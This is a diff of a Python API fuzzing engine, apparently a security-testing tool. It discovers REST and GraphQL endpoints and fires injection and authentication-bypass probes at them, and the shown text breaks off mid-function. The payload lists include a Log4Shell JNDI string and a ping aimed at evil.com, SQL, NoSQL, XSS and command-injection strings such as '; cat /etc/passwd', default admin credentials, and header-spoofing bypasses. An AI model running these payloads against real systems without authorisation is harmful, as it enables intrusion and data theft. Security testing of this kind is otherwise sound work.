@@ -1,898 +1,713 @@
 
 import requests
 import json
-import asyncio
-import websockets
 import time
-from urllib.parse import urljoin, urlparse
-from typing import Dict, List, Any, Optional
 import re
+import threading
+import queue
+from urllib.parse import urlparse, urljoin, parse_qs, urlunparse, urlencode
+from typing import Dict, List, Any, Optional, Tuple
+import itertools
+import random
+import string
+from datetime import datetime
 import concurrent.futures
-from dataclasses import dataclass
-
-@dataclass
-class APIEndpoint:
-    """Represents a discovered API endpoint"""
-    url: str
-    method: str
-    parameters: List[str]
-    headers: Dict[str, str]
-    auth_required: bool
-    rate_limited: bool
-    endpoint_type: str  # REST, GraphQL, WebSocket
 
 class APIFuzzingEngine:
-    """Advanced API fuzzing engine with REST, GraphQL, and WebSocket support"""
+    """Advanced API fuzzing engine for REST/GraphQL endpoints"""
     
     def __init__(self, base_url: str):
         self.base_url = base_url.rstrip('/')
         self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'API-Fuzzer/1.0 (Educational Security Testing)',
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json'
+        })
+        
         self.discovered_endpoints = []
-        self.vulnerabilities_found = []
+        self.vulnerabilities = []
+        self.api_documentation = {}
+        self.authentication_tokens = []
+        self.rate_limit_info = {}
         
-        # API testing payloads
-        self.injection_payloads = [
-            "' OR '1'='1",
-            "'; DROP TABLE users; --",
-            "<script>alert('XSS')</script>",
-            "../../../etc/passwd",
-            "${jndi:ldap://evil.com/a}",
-            "{{7*7}}",
-            "%00",
-            "1; ping -c 1 evil.com"
-        ]
-        
-        self.auth_bypass_payloads = [
-            {"admin": True},
-            {"role": "admin"},
-            {"isAdmin": "true"},
-            {"privileges": "admin"},
-            {"auth": "bypass"},
-            {"user_id": 0},
-            {"user_id": -1}
-        ]
-
-    def discover_api_endpoints(self) -> List[APIEndpoint]:
+    def discover_api_endpoints(self) -> List[str]:
         """Discover API endpoints through various methods"""
-        print("🔍 Discovering API endpoints...")
+        endpoints = set()
         
-        # Method 1: Common API paths
-        self._discover_common_paths()
-        
-        # Method 2: Documentation analysis
-        self._discover_from_documentation()
-        
-        # Method 3: JavaScript analysis
-        self._discover_from_javascript()
-        
-        # Method 4: Subdomain enumeration
-        self._discover_api_subdomains()
-        
-        # Method 5: GraphQL introspection
-        self._discover_graphql_endpoints()
-        
-        # Method 6: WebSocket endpoints
-        self._discover_websocket_endpoints()
-        
-        print(f"✅ Discovered {len(self.discovered_endpoints)} API endpoints")
-        return self.discovered_endpoints
-
-    def _discover_common_paths(self):
-        """Discover APIs from common paths"""
+        # Common API paths
         common_paths = [
-            '/api/v1/', '/api/v2/', '/api/v3/',
-            '/rest/', '/restapi/', '/api/',
-            '/graphql', '/graphql/', '/api/graphql',
-            '/swagger/', '/swagger.json', '/swagger.yaml',
-            '/openapi.json', '/api-docs/',
-            '/v1/', '/v2/', '/v3/',
-            '/json/', '/xml/', '/rpc/',
-            '/services/', '/service/',
-            '/data/', '/feed/', '/feeds/'
+            '/api', '/api/v1', '/api/v2', '/api/v3',
+            '/rest', '/graphql', '/swagger', '/openapi',
+            '/docs', '/api-docs', '/documentation',
+            '/v1', '/v2', '/v3', '/admin/api',
+            '/api/users', '/api/auth', '/api/login',
+            '/api/data', '/api/search', '/api/config'
         ]
         
+        # Discover from robots.txt and sitemap
+        self._discover_from_robots_txt(endpoints)
+        self._discover_from_sitemap(endpoints)
+        
+        # Test common paths
         for path in common_paths:
+            test_url = f"{self.base_url}{path}"
             try:
-                url = self.base_url + path
-                response = self.session.get(url, timeout=5)
-                
-                if response.status_code in [200, 201, 202, 400, 401, 403]:
-                    endpoint_type = self._detect_endpoint_type(url, response)
-                    endpoint = APIEndpoint(
-                        url=url,
-                        method='GET',
-                        parameters=[],
-                        headers=dict(response.headers),
-                        auth_required=response.status_code == 401,
-                        rate_limited=response.status_code == 429,
-                        endpoint_type=endpoint_type
-                    )
-                    self.discovered_endpoints.append(endpoint)
+                response = self.session.get(test_url, timeout=10)
+                if response.status_code in [200, 401, 403, 405]:
+                    endpoints.add(test_url)
+                    
+                    # Look for more endpoints in response
+                    self._extract_endpoints_from_response(response.text, endpoints)
                     
             except Exception:
                 continue
-
-    def _discover_from_documentation(self):
-        """Discover APIs from documentation files"""
-        doc_paths = [
-            '/swagger.json', '/swagger.yaml',
-            '/openapi.json', '/openapi.yaml',
-            '/api-docs.json', '/docs.json',
-            '/redoc/', '/rapidoc/'
-        ]
         
-        for path in doc_paths:
-            try:
-                url = self.base_url + path
-                response = self.session.get(url, timeout=5)
-                
-                if response.status_code == 200:
-                    self._parse_api_documentation(response.text, url)
-                    
-            except Exception:
-                continue
-
-    def _parse_api_documentation(self, content: str, doc_url: str):
-        """Parse API documentation to extract endpoints"""
+        # Discover GraphQL endpoints
+        self._discover_graphql_endpoints(endpoints)
+        
+        # Discover Swagger/OpenAPI docs
+        self._discover_swagger_endpoints(endpoints)
+        
+        self.discovered_endpoints = list(endpoints)
+        return self.discovered_endpoints
+    
+    def _discover_from_robots_txt(self, endpoints: set):
+        """Discover endpoints from robots.txt"""
         try:
-            if 'swagger' in doc_url or 'openapi' in doc_url:
-                # Parse OpenAPI/Swagger documentation
-                try:
-                    doc = json.loads(content)
-                    base_path = doc.get('basePath', '')
-                    
-                    for path, methods in doc.get('paths', {}).items():
-                        for method, details in methods.items():
-                            if isinstance(details, dict):
-                                full_url = self.base_url + base_path + path
-                                
-                                # Extract parameters
-                                parameters = []
-                                if 'parameters' in details:
-                                    parameters = [p.get('name', '') for p in details['parameters']]
-                                
-                                endpoint = APIEndpoint(
-                                    url=full_url,
-                                    method=method.upper(),
-                                    parameters=parameters,
-                                    headers={},
-                                    auth_required='security' in details,
-                                    rate_limited=False,
-                                    endpoint_type='REST'
-                                )
-                                self.discovered_endpoints.append(endpoint)
-                                
-                except json.JSONDecodeError:
-                    pass
-                    
+            response = self.session.get(f"{self.base_url}/robots.txt", timeout=10)
+            if response.status_code == 200:
+                for line in response.text.split('\n'):
+                    if line.strip().startswith(('Disallow:', 'Allow:')):
+                        path = line.split(':', 1)[1].strip()
+                        if '/api' in path.lower():
+                            endpoints.add(f"{self.base_url}{path}")
         except Exception:
             pass
-
-    def _discover_from_javascript(self):
-        """Discover API endpoints from JavaScript files"""
+    
+    def _discover_from_sitemap(self, endpoints: set):
+        """Discover endpoints from sitemap.xml"""
         try:
-            # Get main page
-            response = self.session.get(self.base_url, timeout=10)
-            
-            # Extract JavaScript file URLs
-            js_pattern = r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\'][^>]*>'
-            js_urls = re.findall(js_pattern, response.text, re.IGNORECASE)
-            
-            # Also look for inline API calls
-            api_patterns = [
-                r'["\']([^"\']*\/api\/[^"\']*)["\']',
-                r'["\']([^"\']*\/rest\/[^"\']*)["\']',
-                r'["\']([^"\']*\/graphql[^"\']*)["\']',
-                r'["\']([^"\']*\/v\d+\/[^"\']*)["\']'
-            ]
-            
-            for pattern in api_patterns:
-                matches = re.findall(pattern, response.text, re.IGNORECASE)
-                for match in matches:
-                    if self._is_valid_api_path(match):
-                        full_url = urljoin(self.base_url, match)
-                        endpoint = APIEndpoint(
-                            url=full_url,
-                            method='GET',
-                            parameters=[],
-                            headers={},
-                            auth_required=False,
-                            rate_limited=False,
-                            endpoint_type='REST'
-                        )
-                        self.discovered_endpoints.append(endpoint)
-            
-            # Analyze JavaScript files
-            for js_url in js_urls[:10]:  # Limit to first 10 JS files
-                try:
-                    full_js_url = urljoin(self.base_url, js_url)
-                    js_response = self.session.get(full_js_url, timeout=5)
-                    
-                    for pattern in api_patterns:
-                        matches = re.findall(pattern, js_response.text, re.IGNORECASE)
-                        for match in matches:
-                            if self._is_valid_api_path(match):
-                                full_url = urljoin(self.base_url, match)
-                                endpoint = APIEndpoint(
-                                    url=full_url,
-                                    method='GET',
-                                    parameters=[],
-                                    headers={},
-                                    auth_required=False,
-                                    rate_limited=False,
-                                    endpoint_type='REST'
-                                )
-                                self.discovered_endpoints.append(endpoint)
-                                
-                except Exception:
-                    continue
-                    
+            response = self.session.get(f"{self.base_url}/sitemap.xml", timeout=10)
+            if response.status_code == 200:
+                # Extract URLs from sitemap
+                urls = re.findall(r'<loc>(.*?)</loc>', response.text)
+                for url in urls:
+                    if '/api' in url.lower():
+                        endpoints.add(url)
         except Exception:
             pass
-
-    def _discover_api_subdomains(self):
-        """Discover API-specific subdomains"""
-        api_subdomains = [
-            'api', 'rest', 'ws', 'gateway', 'service',
-            'dev-api', 'stage-api', 'test-api', 'v1', 'v2'
+    
+    def _extract_endpoints_from_response(self, response_text: str, endpoints: set):
+        """Extract API endpoints from response content"""
+        # Look for API paths in JavaScript, JSON, HTML
+        patterns = [
+            r'["\'](/api[^"\']*)["\']',
+            r'["\']([^"\']*api[^"\']*)["\']',
+            r'url:\s*["\']([^"\']*api[^"\']*)["\']',
+            r'endpoint:\s*["\']([^"\']*)["\']',
+            r'path:\s*["\']([^"\']*)["\']'
         ]
         
-        parsed_url = urlparse(self.base_url)
-        base_domain = parsed_url.netloc
-        
-        for subdomain in api_subdomains:
-            try:
-                api_domain = f"{subdomain}.{base_domain}"
-                api_url = f"{parsed_url.scheme}://{api_domain}"
-                
-                response = self.session.get(api_url, timeout=5)
-                if response.status_code in [200, 401, 403]:
-                    endpoint = APIEndpoint(
-                        url=api_url,
-                        method='GET',
-                        parameters=[],
-                        headers=dict(response.headers),
-                        auth_required=response.status_code == 401,
-                        rate_limited=False,
-                        endpoint_type='REST'
-                    )
-                    self.discovered_endpoints.append(endpoint)
-                    
-            except Exception:
-                continue
-
-    def _discover_graphql_endpoints(self):
+        for pattern in patterns:
+            matches = re.findall(pattern, response_text, re.IGNORECASE)
+            for match in matches:
+                if match.startswith('/'):
+                    endpoints.add(f"{self.base_url}{match}")
+                elif match.startswith('http'):
+                    endpoints.add(match)
+    
+    def _discover_graphql_endpoints(self, endpoints: set):
         """Discover GraphQL endpoints"""
-        graphql_paths = [
-            '/graphql', '/graphql/', '/api/graphql',
-            '/v1/graphql', '/query', '/gql'
-        ]
+        graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql', '/query']
         
         for path in graphql_paths:
+            test_url = f"{self.base_url}{path}"
+            
+            # Test with introspection query
+            introspection_query = {
+                "query": """
+                    query IntrospectionQuery {
+                        __schema {
+                            queryType { name }
+                            mutationType { name }
+                            subscriptionType { name }
+                        }
+                    }
+                """
+            }
+            
             try:
-                url = self.base_url + path
-                
-                # Try GraphQL introspection query
-                introspection_query = {
-                    "query": "query IntrospectionQuery { __schema { queryType { name } } }"
-                }
-                
-                response = self.session.post(
-                    url,
-                    json=introspection_query,
-                    headers={'Content-Type': 'application/json'},
-                    timeout=5
-                )
-                
+                response = self.session.post(test_url, json=introspection_query, timeout=10)
                 if response.status_code == 200 and 'data' in response.text:
-                    endpoint = APIEndpoint(
-                        url=url,
-                        method='POST',
-                        parameters=['query', 'variables'],
-                        headers={'Content-Type': 'application/json'},
-                        auth_required=False,
-                        rate_limited=False,
-                        endpoint_type='GraphQL'
-                    )
-                    self.discovered_endpoints.append(endpoint)
-                    
+                    endpoints.add(test_url)
+                    # Store GraphQL schema info
+                    self.api_documentation[test_url] = {
+                        'type': 'GraphQL',
+                        'introspection_response': response.json()
+                    }
             except Exception:
                 continue
-
-    def _discover_websocket_endpoints(self):
-        """Discover WebSocket endpoints"""
-        ws_paths = [
-            '/ws', '/websocket', '/socket.io',
-            '/api/ws', '/live', '/realtime',
-            '/stream', '/events'
+    
+    def _discover_swagger_endpoints(self, endpoints: set):
+        """Discover Swagger/OpenAPI documentation"""
+        swagger_paths = [
+            '/swagger.json', '/swagger.yaml', '/openapi.json',
+            '/api-docs', '/swagger-ui', '/docs/swagger',
+            '/api/swagger.json', '/v1/swagger.json'
         ]
         
-        for path in ws_paths:
+        for path in swagger_paths:
+            test_url = f"{self.base_url}{path}"
             try:
-                # Convert HTTP to WebSocket URL
-                ws_url = self.base_url.replace('http://', 'ws://').replace('https://', 'wss://') + path
-                
-                # Basic connectivity test
-                endpoint = APIEndpoint(
-                    url=ws_url,
-                    method='CONNECT',
-                    parameters=[],
-                    headers={},
-                    auth_required=False,
-                    rate_limited=False,
-                    endpoint_type='WebSocket'
-                )
-                self.discovered_endpoints.append(endpoint)
-                
+                response = self.session.get(test_url, timeout=10)
+                if response.status_code == 200:
+                    try:
+                        swagger_doc = response.json()
+                        if 'swagger' in swagger_doc or 'openapi' in swagger_doc:
+                            endpoints.add(test_url)
+                            self._parse_swagger_doc(swagger_doc, endpoints)
+                    except json.JSONDecodeError:
+                        pass
             except Exception:
                 continue
-
-    def _detect_endpoint_type(self, url: str, response: requests.Response) -> str:
-        """Detect the type of API endpoint"""
-        content_type = response.headers.get('content-type', '').lower()
-        
-        if 'graphql' in url.lower():
-            return 'GraphQL'
-        elif 'ws' in url.lower() or 'websocket' in url.lower():
-            return 'WebSocket'
-        elif any(keyword in url.lower() for keyword in ['rest', 'api']):
-            return 'REST'
-        elif 'application/json' in content_type:
-            return 'REST'
-        else:
-            return 'Unknown'
-
-    def _is_valid_api_path(self, path: str) -> bool:
-        """Check if path looks like a valid API endpoint"""
-        api_indicators = [
-            '/api/', '/rest/', '/v1/', '/v2/', '/v3/',
-            '/graphql', '/json', '/xml'
-        ]
-        
-        return any(indicator in path.lower() for indicator in api_indicators)
-
+    
+    def _parse_swagger_doc(self, swagger_doc: Dict, endpoints: set):
+        """Parse Swagger documentation to extract endpoints"""
+        if 'paths' in swagger_doc:
+            base_path = swagger_doc.get('basePath', '')
+            host = swagger_doc.get('host', '')
+            
+            for path, methods in swagger_doc['paths'].items():
+                full_path = f"{base_path}{path}"
+                endpoint_url = f"{self.base_url}{full_path}"
+                endpoints.add(endpoint_url)
+                
+                # Store endpoint documentation
+                self.api_documentation[endpoint_url] = {
+                    'type': 'REST',
+                    'methods': list(methods.keys()),
+                    'swagger_info': methods
+                }
+    
     def fuzz_discovered_endpoints(self, aggressive: bool = False) -> Dict[str, Any]:
         """Fuzz all discovered endpoints"""
-        print(f"🎯 Fuzzing {len(self.discovered_endpoints)} discovered endpoints...")
-        
         results = {
             'total_endpoints': len(self.discovered_endpoints),
             'vulnerabilities_found': 0,
             'authentication_bypasses': 0,
             'injection_vulnerabilities': 0,
+            'information_disclosures': 0,
+            'rate_limit_bypasses': 0,
             'detailed_results': []
         }
         
-        # Use threading for faster testing
-        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+        # Use threading for faster fuzzing
+        max_workers = 10 if aggressive else 5
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = []
             
             for endpoint in self.discovered_endpoints:
-                if endpoint.endpoint_type == 'REST':
-                    future = executor.submit(self._fuzz_rest_endpoint, endpoint, aggressive)
-                elif endpoint.endpoint_type == 'GraphQL':
-                    future = executor.submit(self._fuzz_graphql_endpoint, endpoint, aggressive)
-                elif endpoint.endpoint_type == 'WebSocket':
-                    future = executor.submit(self._fuzz_websocket_endpoint, endpoint, aggressive)
-                else:
-                    future = executor.submit(self._fuzz_generic_endpoint, endpoint, aggressive)
-                
+                future = executor.submit(self._fuzz_single_endpoint, endpoint, aggressive)
                 futures.append(future)
             
-            # Collect results
             for future in concurrent.futures.as_completed(futures):
                 try:
-                    endpoint_result = future.result(timeout=30)
-                    results['detailed_results'].append(endpoint_result)
-                    results['vulnerabilities_found'] += len(endpoint_result.get('vulnerabilities', []))
+                    endpoint_results = future.result()
+                    results['detailed_results'].append(endpoint_results)
                     
-                    # Count specific vulnerability types
-                    for vuln in endpoint_result.get('vulnerabilities', []):
-                        if 'authentication' in vuln.get('type', '').lower():
+                    # Update counters
+                    for vuln in endpoint_results.get('vulnerabilities', []):
+                        results['vulnerabilities_found'] += 1
+                        if 'authentication' in vuln['type'].lower():
                             results['authentication_bypasses'] += 1
-                        elif 'injection' in vuln.get('type', '').lower():
+                        elif 'injection' in vuln['type'].lower():
                             results['injection_vulnerabilities'] += 1
+                        elif 'disclosure' in vuln['type'].lower():
+                            results['information_disclosures'] += 1
+                        elif 'rate limit' in vuln['type'].lower():
+                            results['rate_limit_bypasses'] += 1
                             
                 except Exception as e:
-                    print(f"❌ Endpoint fuzzing failed: {e}")
+                    continue
         
-        print(f"✅ API fuzzing complete - Found {results['vulnerabilities_found']} vulnerabilities")
         return results
-
-    def _fuzz_rest_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
-        """Fuzz REST API endpoint"""
-        result = {
-            'endpoint': endpoint.url,
-            'method': endpoint.method,
-            'type': 'REST',
+    
+    def _fuzz_single_endpoint(self, endpoint: str, aggressive: bool) -> Dict[str, Any]:
+        """Fuzz a single API endpoint"""
+        results = {
+            'endpoint': endpoint,
+            'methods_tested': [],
             'vulnerabilities': [],
-            'response_codes': [],
+            'response_times': [],
+            'status_codes': {},
+            'authentication_tests': [],
+            'injection_tests': []
+        }
+        
+        # Test different HTTP methods
+        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
+        if not aggressive:
+            methods = ['GET', 'POST', 'PUT', 'DELETE']
+        
+        for method in methods:
+            method_results = self._test_method_on_endpoint(endpoint, method, aggressive)
+            results['methods_tested'].append(method)
+            results['vulnerabilities'].extend(method_results.get('vulnerabilities', []))
+            results['response_times'].extend(method_results.get('response_times', []))
+            
+            # Update status codes
+            for status, count in method_results.get('status_codes', {}).items():
+                results['status_codes'][status] = results['status_codes'].get(status, 0) + count
+        
+        # Test authentication bypasses
+        auth_results = self._test_authentication_bypasses(endpoint)
+        results['authentication_tests'] = auth_results
+        results['vulnerabilities'].extend(auth_results.get('vulnerabilities', []))
+        
+        # Test injection vulnerabilities
+        injection_results = self._test_injection_vulnerabilities(endpoint, aggressive)
+        results['injection_tests'] = injection_results
+        results['vulnerabilities'].extend(injection_results.get('vulnerabilities', []))
+        
+        return results
+    
+    def _test_method_on_endpoint(self, endpoint: str, method: str, aggressive: bool) -> Dict[str, Any]:
+        """Test a specific HTTP method on an endpoint"""
+        results = {
+            'method': method,
+            'vulnerabilities': [],
+            'response_times': [],
+            'status_codes': {},
             'interesting_responses': []
         }
         
-        # Test injection vulnerabilities
-        for payload in self.injection_payloads:
-            try:
-                # Test in URL parameters
-                test_url = f"{endpoint.url}?test={payload}"
-                response = self.session.get(test_url, timeout=5)
-                
-                result['response_codes'].append(response.status_code)
-                
-                if self._detect_injection_success(response, payload):
-                    result['vulnerabilities'].append({
-                        'type': 'Injection Vulnerability',
-                        'payload': payload,
-                        'endpoint': test_url,
-                        'evidence': 'Injection pattern detected in response'
-                    })
-                
-                # Test in POST body
-                if endpoint.method in ['POST', 'PUT', 'PATCH']:
-                    test_data = {'param': payload}
-                    response = self.session.request(
-                        endpoint.method,
-                        endpoint.url,
-                        json=test_data,
-                        timeout=5
-                    )
-                    
-                    if self._detect_injection_success(response, payload):
-                        result['vulnerabilities'].append({
-                            'type': 'JSON Injection Vulnerability',
-                            'payload': payload,
-                            'endpoint': endpoint.url,
-                            'method': endpoint.method,
-                            'evidence': 'Injection pattern detected in JSON response'
-                        })
-                        
-            except Exception:
-                continue
-        
-        # Test authentication bypass
-        for auth_payload in self.auth_bypass_payloads:
-            try:
-                response = self.session.request(
-                    endpoint.method,
-                    endpoint.url,
-                    json=auth_payload,
-                    timeout=5
-                )
-                
-                if self._detect_auth_bypass(response, auth_payload):
-                    result['vulnerabilities'].append({
-                        'type': 'Authentication Bypass',
-                        'payload': str(auth_payload),
-                        'endpoint': endpoint.url,
-                        'method': endpoint.method,
-                        'evidence': 'Unauthorized access achieved'
-                    })
-                    
-            except Exception:
-                continue
-        
-        # Test rate limiting
-        if aggressive:
-            rate_limit_result = self._test_rate_limiting(endpoint)
-            if rate_limit_result:
-                result['vulnerabilities'].append(rate_limit_result)
-        
-        return result
-
-    def _fuzz_graphql_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
-        """Fuzz GraphQL endpoint"""
-        result = {
-            'endpoint': endpoint.url,
-            'method': endpoint.method,
-            'type': 'GraphQL',
-            'vulnerabilities': [],
-            'schema_exposed': False,
-            'queries_tested': 0
-        }
-        
-        # Test introspection
-        introspection_query = {
-            "query": """
-            query IntrospectionQuery {
-                __schema {
-                    queryType { name fields { name } }
-                    mutationType { name fields { name } }
-                    types { name kind fields { name type { name kind } } }
-                }
-            }
-            """
-        }
-        
+        # Basic method test
         try:
-            response = self.session.post(
-                endpoint.url,
-                json=introspection_query,
-                headers={'Content-Type': 'application/json'},
-                timeout=10
-            )
+            start_time = time.time()
+            response = self.session.request(method, endpoint, timeout=15)
+            response_time = time.time() - start_time
             
-            if response.status_code == 200 and '__schema' in response.text:
-                result['schema_exposed'] = True
-                result['vulnerabilities'].append({
-                    'type': 'GraphQL Introspection Enabled',
-                    'endpoint': endpoint.url,
-                    'evidence': 'Full schema accessible via introspection',
-                    'risk': 'Information disclosure'
+            results['response_times'].append(response_time)
+            status = str(response.status_code)
+            results['status_codes'][status] = results['status_codes'].get(status, 0) + 1
+            
+            # Check for interesting responses
+            if response.status_code in [200, 201, 202]:
+                results['interesting_responses'].append({
+                    'status_code': response.status_code,
+                    'response_length': len(response.text),
+                    'content_type': response.headers.get('Content-Type', ''),
+                    'has_json': self._is_json_response(response)
                 })
                 
-                # Extract schema information for further testing
-                try:
-                    schema_data = response.json()
-                    queries = self._extract_graphql_queries(schema_data)
-                    
-                    # Test extracted queries with injection payloads
-                    for query in queries[:5]:  # Limit to first 5
-                        for payload in self.injection_payloads[:3]:  # Limit payloads
-                            injection_query = self._create_injection_query(query, payload)
-                            
-                            test_response = self.session.post(
-                                endpoint.url,
-                                json={"query": injection_query},
-                                headers={'Content-Type': 'application/json'},
-                                timeout=5
-                            )
-                            
-                            result['queries_tested'] += 1
-                            
-                            if self._detect_graphql_injection(test_response, payload):
-                                result['vulnerabilities'].append({
-                                    'type': 'GraphQL Injection',
-                                    'query': query,
-                                    'payload': payload,
-                                    'endpoint': endpoint.url,
-                                    'evidence': 'Injection successful in GraphQL query'
-                                })
-                                
-                except Exception:
-                    pass
-                    
+                # Check for sensitive data exposure
+                if self._check_sensitive_data_exposure(response.text):
+                    results['vulnerabilities'].append({
+                        'type': 'Information Disclosure',
+                        'severity': 'Medium',
+                        'method': method,
+                        'endpoint': endpoint,
+                        'description': 'Sensitive information exposed in API response',
+                        'evidence': 'Response contains sensitive data patterns'
+                    })
+            
+            # Check for verbose error messages
+            if response.status_code >= 400:
+                if self._check_verbose_errors(response.text):
+                    results['vulnerabilities'].append({
+                        'type': 'Information Disclosure',
+                        'severity': 'Low',
+                        'method': method,
+                        'endpoint': endpoint,
+                        'description': 'Verbose error messages expose system information',
+                        'evidence': f'HTTP {response.status_code} with detailed error'
+                    })
+        
+        except Exception as e:
+            pass
+        
+        # Test parameter fuzzing if aggressive
+        if aggressive and method in ['GET', 'POST']:
+            param_results = self._fuzz_parameters(endpoint, method)
+            results['vulnerabilities'].extend(param_results.get('vulnerabilities', []))
+        
+        return results
+    
+    def _test_authentication_bypasses(self, endpoint: str) -> Dict[str, Any]:
+        """Test various authentication bypass techniques"""
+        results = {
+            'vulnerabilities': [],
+            'bypass_attempts': []
+        }
+        
+        # Test without authentication
+        try:
+            response = self.session.get(endpoint, timeout=10)
+            if response.status_code == 200:
+                results['bypass_attempts'].append({
+                    'method': 'No authentication',
+                    'status_code': response.status_code,
+                    'success': True
+                })
+                
+                results['vulnerabilities'].append({
+                    'type': 'Authentication Bypass',
+                    'severity': 'High',
+                    'endpoint': endpoint,
+                    'description': 'API endpoint accessible without authentication',
+                    'evidence': f'HTTP 200 response without credentials'
+                })
         except Exception:
             pass
         
-        # Test depth-based DoS
-        if aggressive:
-            dos_result = self._test_graphql_dos(endpoint)
-            if dos_result:
-                result['vulnerabilities'].append(dos_result)
+        # Test with invalid tokens
+        invalid_tokens = [
+            'Bearer invalid',
+            'Bearer 123456',
+            'Bearer null',
+            'Bearer undefined',
+            'Basic invalid',
+            'Basic ' + 'YWRtaW46cGFzc3dvcmQ='  # admin:password
+        ]
         
-        return result
-
-    def _fuzz_websocket_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
-        """Fuzz WebSocket endpoint"""
-        result = {
-            'endpoint': endpoint.url,
-            'method': endpoint.method,
-            'type': 'WebSocket',
-            'vulnerabilities': [],
-            'connection_successful': False,
-            'messages_tested': 0
-        }
-        
-        try:
-            # Test WebSocket connection
-            asyncio.run(self._test_websocket_connection(endpoint, result))
-        except Exception as e:
-            result['connection_error'] = str(e)
-        
-        return result
-
-    async def _test_websocket_connection(self, endpoint: APIEndpoint, result: Dict):
-        """Test WebSocket connection and message injection"""
-        try:
-            uri = endpoint.url
-            
-            async with websockets.connect(uri, timeout=10) as websocket:
-                result['connection_successful'] = True
-                
-                # Test message injection
-                test_messages = [
-                    '{"type": "auth", "token": "admin"}',
-                    '{"action": "admin", "data": "test"}',
-                    '{"cmd": "' + self.injection_payloads[0] + '"}',
-                    '{"query": "' + self.injection_payloads[1] + '"}'
-                ]
-                
-                for message in test_messages:
-                    try:
-                        await websocket.send(message)
-                        response = await asyncio.wait_for(websocket.recv(), timeout=5)
-                        
-                        result['messages_tested'] += 1
-                        
-                        if self._detect_websocket_injection(response, message):
-                            result['vulnerabilities'].append({
-                                'type': 'WebSocket Injection',
-                                'message': message,
-                                'endpoint': endpoint.url,
-                                'evidence': 'Injection detected in WebSocket response'
-                            })
-                            
-                    except asyncio.TimeoutError:
-                        continue
-                    except Exception:
-                        continue
-                        
-        except Exception as e:
-            result['connection_error'] = str(e)
-
-    def _fuzz_generic_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
-        """Fuzz generic/unknown endpoint type"""
-        result = {
-            'endpoint': endpoint.url,
-            'method': endpoint.method,
-            'type': 'Generic',
-            'vulnerabilities': [],
-            'response_analysis': {}
-        }
-        
-        # Basic fuzzing similar to REST
-        for payload in self.injection_payloads[:3]:  # Limited payloads for unknown types
+        for token in invalid_tokens:
             try:
-                test_url = f"{endpoint.url}?test={payload}"
-                response = self.session.get(test_url, timeout=5)
+                headers = {'Authorization': token}
+                response = self.session.get(endpoint, headers=headers, timeout=10)
                 
-                if self._detect_injection_success(response, payload):
-                    result['vulnerabilities'].append({
-                        'type': 'Potential Injection',
-                        'payload': payload,
-                        'endpoint': test_url,
-                        'evidence': 'Suspicious response pattern'
+                if response.status_code == 200:
+                    results['vulnerabilities'].append({
+                        'type': 'Authentication Bypass',
+                        'severity': 'High',
+                        'endpoint': endpoint,
+                        'description': f'API accepts invalid authentication token',
+                        'evidence': f'Token: {token[:20]}...'
                     })
+                
+                results['bypass_attempts'].append({
+                    'method': f'Invalid token: {token[:20]}...',
+                    'status_code': response.status_code,
+                    'success': response.status_code == 200
+                })
+                
+            except Exception:
+                continue
+        
+        # Test header manipulation
+        bypass_headers = [
+            {'X-Forwarded-For': '127.0.0.1'},
+            {'X-Real-IP': '127.0.0.1'},
+            {'X-Original-URL': '/admin'},
+            {'X-Rewrite-URL': '/admin'},
+            {'X-Override-URL': '/admin'},
+            {'X-HTTP-Method-Override': 'GET'}
+        ]
+        
+        for headers in bypass_headers:
+            try:
+                response = self.session.get(endpoint, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    results['vulnerabilities'].append({
+                        'type': 'Authentication Bypass',
+                        'severity': 'Medium',
+                        'endpoint': endpoint,
+                        'description': f'Header manipulation bypasses authentication',
+                        'evidence': f'Headers: {headers}'
+                    })
+            except Exception:
+                continue
+        
+        return results
+    
+    def _test_injection_vulnerabilities(self, endpoint: str, aggressive: bool) -> Dict[str, Any]:
+        """Test for various injection vulnerabilities"""
+        results = {
+            'vulnerabilities': [],
+            'injection_tests': []
+        }
+        
+        # SQL Injection payloads
+        sql_payloads = [
+            "' OR 1=1--",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT null,null,null--",
+            "admin'--",
+            "' OR 'a'='a"
+        ]
+        
+        # NoSQL Injection payloads
+        nosql_payloads = [
+            '{"$ne": null}',
+            '{"$gt": ""}',
+            '{"$where": "function() { return true; }"}',
+            '{"$regex": ".*"}',
+            '{"$exists": true}'
+        ]
+        
+        # XSS payloads
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<svg onload=alert('XSS')>",
+            "'\"><script>alert('XSS')</script>"
+        ]
+        
+        # Command injection payloads
+        cmd_payloads = [
+            "; ls",
+            "| whoami",
+            "& dir",
+            "; cat /etc/passwd",
+            "&& ping 127.0.0.1"
+        ]
+        
+        all_payloads = {
+            'SQL Injection': sql_payloads,
+            'NoSQL Injection': nosql_payloads if aggressive else [],
+            'XSS': xss_payloads,
+            'Command Injection': cmd_payloads if aggressive else []
+        }
+        
+        for injection_type, payloads in all_payloads.items():
+            for payload in payloads:
+                # Test in URL parameters
+                vuln_found = self._test_payload_in_parameters(endpoint, payload, injection_type)
+                if vuln_found:
+                    results['vulnerabilities'].append(vuln_found)
+                
+                # Test in POST body
+                if aggressive:
+                    vuln_found = self._test_payload_in_body(endpoint, payload, injection_type)
+                    if vuln_found:
+                        results['vulnerabilities'].append(vuln_found)
+        
+        return results
+    
+    def _test_payload_in_parameters(self, endpoint: str, payload: str, injection_type: str) -> Optional[Dict]:
+        """Test injection payload in URL parameters"""
+        # Add payload to common parameter names
+        param_names = ['id', 'user', 'search', 'query', 'data', 'input', 'value']
+        
+        for param_name in param_names:
+            test_url = f"{endpoint}?{param_name}={payload}"
+            
+            try:
+                response = self.session.get(test_url, timeout=10)
+                
+                # Check for injection indicators
+                if self._detect_injection_success(response.text, injection_type, payload):
+                    return {
